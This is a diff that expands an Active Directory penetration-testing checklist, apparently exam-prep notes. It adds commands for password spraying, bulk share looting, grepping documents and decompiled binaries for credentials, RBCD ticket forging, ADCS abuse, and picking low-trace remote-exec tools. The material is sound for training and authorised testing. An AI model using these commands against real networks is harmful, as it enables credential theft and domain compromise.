@@ -22,14 +22,16 @@ Reference: [AD Enumeration](../1-information-gathering/06-active-directory-enume
 
 ## When you have one credential
 
-- [ ] **Spray it everywhere**: `nxc smb hosts.txt -u <user> -p <pass> --continue-on-success`.
-- [ ] SMB shares readable? `nxc smb <ip> -u <user> -p <pass> --shares`, then `smbclient //<ip>/<share> -U <user>`.
+- [ ] **Spray it everywhere**: `nxc smb hosts.txt -u <user> -p <pass> --continue-on-success`, then repeat with `-winrm`, `-mssql`, `-ldap`, `-ssh`, `-ftp`.
+- [ ] SMB shares readable? `nxc smb <ip> -u <user> -p <pass> --shares`, then `smbclient //<ip>/<share> -U '<user>%<pass>'`.
+- [ ] **Mount instead of interactive smbclient** — `sudo mount -t cifs //<ip>/<share> ./loot -o username=<user>,password=<pass>,vers=3.0` — tab-complete and grep like a real FS.
+- [ ] **Auto-download every readable share**: `nxc smb <ip> -u <user> -p <pass> -M spider_plus -o DOWNLOAD_FLAG=true` → files land in `/root/.nxc/modules/nxc_spider_plus/<ip>/`.
 - [ ] Dump SPNs (Kerberoast): `impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc-ip> -request -outputfile spns.hash`.
 - [ ] AS-REP roast with creds: `impacket-GetNPUsers <domain>/<user>:<pass> -request -dc-ip <dc-ip>`.
 - [ ] Domain enum with bloodhound: `bloodhound-python -u <user> -p <pass> -d <domain> -ns <dc-ip> -c All`.
   - Import into BloodHound → run "Find Shortest Paths to Domain Admins" from your owned user.
 - [ ] LDAP dump: `ldapdomaindump -u <domain>\\<user> -p <pass> <dc-ip>`.
-- [ ] Password stored in `Description` field: `nxc ldap <dc-ip> -u <user> -p <pass> -M user-desc`.
+- [ ] Password stored in `Description` / `Info` / `Comment` fields: `nxc ldap <dc-ip> -u <user> -p <pass> -M user-desc`, then also grep the full LDAP dump for `pass`, `pwd`, `secret`, `cred`.
 
 ## Common share loot (do this immediately after mounting anything)
 
@@ -38,6 +40,8 @@ Reference: [AD Enumeration](../1-information-gathering/06-active-directory-enume
 - [ ] Any `.kdbx` file (KeePass) → download → `keepass2john` → hashcat mode 13400.
 - [ ] `unattend.xml`, `sysprep.xml`, `autounattend.xml` — plaintext admin creds.
 - [ ] User profile shares — `.rdp` files with saved creds, browser profiles.
+- [ ] **`.xlsx` / `.docx` / `.pptx` that won't open cleanly** — they're just ZIP files. `unzip file.xlsx -d out/`, then `grep -r 'pass\|user' out/`. Strings live in `xl/sharedStrings.xml`.
+- [ ] **Custom admin binaries (`UserInfo.exe`, `LoginChecker.exe`, anything internal-looking)** — `strings -n 8 <file> | grep -iE 'pass|ldap|conn'`. If .NET: `ilspycmd <file> -o decompiled/` and grep for creds. Service accounts often called `ldap`, `svc_ldap`.
 
 ## Attack list (tick as you rule each out)
 
@@ -47,10 +51,10 @@ Reference: [AD Enumeration](../1-information-gathering/06-active-directory-enume
 - [ ] **ACL abuse** — check BloodHound edges outbound from your user: `GenericAll`, `WriteDACL`, `WriteOwner`, `ForceChangePassword`. Use `bloodyAD`. See [ACL Abuse](../5-lateral-movement/04-acl-abuse-bloodyad.md).
 - [ ] **Unconstrained delegation** — hosts with `TRUSTED_FOR_DELEGATION`. Coerce DC → capture TGT.
 - [ ] **Constrained delegation** — S4U2Self + S4U2Proxy dance.
-- [ ] **Resource-based constrained delegation (RBCD)** — need `WriteProperty` on `msDS-AllowedToActOnBehalfOfOtherIdentity`.
+- [ ] **Resource-based constrained delegation (RBCD)** — need `WriteProperty` on `msDS-AllowedToActOnBehalfOfOtherIdentity`. Before running `getST`: `unset KRB5CCNAME`, `sudo ntpdate <dc-ip>`, and confirm the target FQDN is in `/etc/hosts`. Use `sAMAccountName$` (with the `$`) as the RBCD target — not the FQDN. Ticket lands as whatever `ls *.ccache` returns.
 - [ ] **PetitPotam / PrinterBug / DFSCoerce** — force auth from a host. Chain with unconstrained/ntlmrelay.
 - [ ] **NTLM relay** — `ntlmrelayx -tf targets.txt -smb2support` while `responder -I tun0` runs.
-- [ ] **ADCS** — ESC1 through ESC8. `certipy find -u <user>@<domain> -p <pass> -dc-ip <dc-ip> -vulnerable`.
+- [ ] **ADCS** — ESC1 through ESC16. `certipy-ad find -u <user>@<domain> -p <pass> -dc-ip <dc-ip> -vulnerable -stdout`. Naming tell: any `ca_svc` / `cert_svc` / `pki_svc` account is the CA operator — if you can steal its NT hash (WriteOwner chain → `certipy-ad shadow auto`) you almost certainly have DA via ESC1 / ESC4. Full chain in [ACL Abuse → ADCS](../5-lateral-movement/04-acl-abuse-bloodyad.md).
 - [ ] **noPac (CVE-2021-42278/42287)** — `impacket-noPac` if MAQ > 0 and DC unpatched.
 - [ ] **Zerologon (CVE-2020-1472)** — only if the exam brief allows. Nukes the DC's password.
 - [ ] **PrintNightmare (CVE-2021-34527)** — local privesc on any Windows host with spooler on.
@@ -63,6 +67,7 @@ Reference: [AD Enumeration](../1-information-gathering/06-active-directory-enume
 - [ ] Pass-the-hash across the estate: `nxc smb hosts.txt -u <user> -H <NT-hash> --continue-on-success`.
 - [ ] Pass-the-ticket if you have a `.ccache`: `export KRB5CCNAME=./ticket.ccache; nxc smb <ip> -k --use-kcache`.
 - [ ] Silver ticket (service TGS) or golden ticket (KRBTGT hash) — see [Kerberos Attacks](../5-lateral-movement/03-kerberos-attacks.md).
+- [ ] **Pick your exec method by artifact cost** — quiet → loud: `dcomexec` / `wmiexec` → `atexec` → `smbexec` → `psexec`. WinRM ≠ required; if SMB auth works, one of the five will land a shell. See [Windows Pivoting](../5-lateral-movement/05-windows-pivoting.md).
 
 ## Post-DA
 
